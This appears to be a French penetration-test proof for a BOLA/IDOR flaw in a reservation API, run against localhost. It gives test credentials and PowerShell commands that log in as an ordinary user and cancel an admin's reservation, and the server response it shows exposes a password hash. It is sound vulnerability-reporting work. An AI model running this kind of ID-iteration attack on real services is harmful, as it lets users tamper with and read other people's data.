# Preuve — Broken Object Level Authorization (BOLA/IDOR)

## Endpoint concerné
`PATCH /api/reservations/{id}`

## Description
Un utilisateur authentifié avec le rôle `ROLE_USER` peut consulter et modifier
une réservation qui ne lui appartient pas, simplement en devinant/itérant son `id`.
Aucune vérification d'ownership (`reservation.owner === utilisateur connecté`)
n'est effectuée côté backend.

## Cause technique
API Platform génère le CRUD par défaut sur l'entité `Reservation` sans
`security` configurée sur les opérations `Get`/`Patch`. N'importe quel
utilisateur authentifié (`IS_AUTHENTICATED_FULLY`) peut donc agir sur
n'importe quelle ressource, peu importe son `owner`.

## Comptes utilisés pour le test
- Attaquant : `user@test.com` / `password123` (ROLE_USER)
- Victime : `admin@test.com` (propriétaire de la réservation #2)

## Exploitation

1. Connexion en tant que `user@test.com` :
```powershell
$response = Invoke-RestMethod -Uri "http://localhost:8086/api/login" -Method Post -ContentType "application/json" -Body '{"email":"user@test.com","password":"password123"}'
$token = $response.token
```

2. Lecture de la réservation #2 (appartenant à admin) — déjà accessible via la
   simple liste `GET /api/reservations`, qui retourne toutes les réservations
   tous utilisateurs confondus, pas seulement les siennes.

3. Modification de la réservation #2 sans en être le propriétaire :
```powershell
Invoke-RestMethod -Uri "http://localhost:8086/api/reservations/2" -Method Patch -Headers @{ Authorization = "Bearer $token"; "Content-Type" = "application/merge-patch+json" } -Body '{"status":"cancelled"}'
```

## Réponse serveur obtenue (200 OK)
```json
{
  "@context": "/api/contexts/Reservation",
  "@id": "/api/reservations/2",
  "@type": "Reservation",
  "id": 2,
  "resourceName": "Salle de coworking B",
  "startAt": "2026-07-16T10:00:00+00:00",
  "status": "cancelled",
  "note": "Réservation admin - test",
  "owner": {
    "@type": "User",
    "id": 4,
    "email": "admin@test.com",
    "userIdentifier": "admin@test.com",
    "roles": ["ROLE_ADMIN", "ROLE_USER"],
    "password": "$2y$13$aLhPX73Sg5nI8su4zz6QIetJ3bf02smz3Ke5Nx8fRyiZkN.3tpzz6"
  }
}
```

Le `status` de la réservation d'admin est passé de `pending` à `cancelled` sur
demande d'un simple utilisateur non propriétaire.

## Impact
- Technique : contournement total du contrôle d'accès au niveau objet (BOLA).
- Métier : n'importe quel client pourrait annuler, modifier ou consulter les
  réservations de n'importe quel autre client (ou de l'admin), simplement en
  changeant l'id dans l'URL.

## Criticité
**Élevée** — exploitation triviale, aucune authentification particulière
requise au-delà d'un compte standard, impact direct sur la confidentialité et
l'intégrité des données d'autrui.

## Capture d'écran
